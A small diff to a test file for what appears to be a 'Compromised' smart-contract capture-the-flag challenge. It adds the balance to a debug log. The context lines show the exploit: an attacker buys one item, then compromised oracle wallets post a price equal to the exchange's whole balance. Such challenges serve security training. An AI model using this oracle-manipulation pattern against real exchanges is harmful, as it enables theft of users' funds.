@@ -88,7 +88,7 @@ describe('Compromised challenge', function () {
 		await this.exchange.connect(attacker).buyOne( { value: 1 });
         console.log("Bought one")
 		let exchangeBalance = this.exchange.balance;
-        console.log("Balance")
+        console.log("Balance",exchangeBalance)
 		for (let i = 0; i < wallets.length; i++) {
 			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol, exchangeBalance);
         }
